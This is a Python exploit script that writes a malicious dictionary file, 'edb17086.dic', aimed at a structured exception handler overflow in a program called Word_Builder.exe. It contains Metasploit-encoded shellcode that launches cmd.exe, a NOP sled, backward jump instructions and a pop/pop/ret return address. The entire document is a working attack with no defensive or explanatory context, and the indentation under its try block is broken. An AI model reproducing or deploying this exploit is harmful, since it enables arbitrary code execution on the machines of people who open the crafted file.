from struct import *

file = "edb17086.dic"

# msfpayload windows/exec CMD=cmd.exe R | msfencode -b '\x00\x0a\x0d' -t perl
# [*] x86/shikata_ga_nai succeeded with size 226 (iteration=1)

cmmd = ("\xda\xd5\xb8\x4f\xc1\x95\xae\xd9\x74\x24\xf4\x5a\x29\xc9" +
"\xb1\x32\x83\xc2\x04\x31\x42\x16\x03\x42\x16\xe2\xba\x3d" +
"\x7d\x27\x44\xbe\x7e\x58\xcd\x5b\x4f\x4a\xa9\x28\xe2\x5a" +
"\xba\x7d\x0f\x10\xee\x95\x84\x54\x26\x99\x2d\xd2\x10\x94" +
"\xae\xd2\x9c\x7a\x6c\x74\x60\x81\xa1\x56\x59\x4a\xb4\x97" +
"\x9e\xb7\x37\xc5\x77\xb3\xea\xfa\xfc\x81\x36\xfa\xd2\x8d" +
"\x07\x84\x57\x51\xf3\x3e\x56\x82\xac\x35\x10\x3a\xc6\x12" +
"\x80\x3b\x0b\x41\xfc\x72\x20\xb2\x77\x85\xe0\x8a\x78\xb7" +
"\xcc\x41\x47\x77\xc1\x98\x80\xb0\x3a\xef\xfa\xc2\xc7\xe8" +
"\x39\xb8\x13\x7c\xdf\x1a\xd7\x26\x3b\x9a\x34\xb0\xc8\x90" +
"\xf1\xb6\x96\xb4\x04\x1a\xad\xc1\x8d\x9d\x61\x40\xd5\xb9" +
"\xa5\x08\x8d\xa0\xfc\xf4\x60\xdc\x1e\x50\xdc\x78\x55\x73" +
"\x09\xfa\x34\x1e\xcc\x8e\x43\x67\xce\x90\x4b\xc8\xa7\xa1" +
"\xc0\x87\xb0\x3d\x03\xec\x4f\x74\x09\x45\xd8\xd1\xd8\xd7" +
"\x85\xe1\x37\x1b\xb0\x61\xbd\xe4\x47\x79\xb4\xe1\x0c\x3d" +
"\x25\x98\x1d\xa8\x49\x0f\x1d\xf9\x2a\xc2\x85\x2c\xc9\x64" +
"\x23\x31")

nop1 = "\x90"*3777
nop2 = "\x90"*100
jmp2 = "\xE9\xA8\xFD\xFF\xFF" # near jump (back) 600B (0xFFFFFDA8)
nseh = pack ('<I', 0x90909CEB)# short jump (back) 100B (0xFF9C)
cseh = pack ('<I', 0x0040143C)# p/p/r 0040143C Word_Builder.exe

sploit = nop1+cmmd+nop2+jmp2+nseh+cseh
#3777 226  100  544

try:
handle = open (file, 'w')
handle.write (sploit)
handle.close ()
print "[+] sploit ready: " + file + " (" + str (len (sploit)) + "B)"
except:
print "[-] exception!"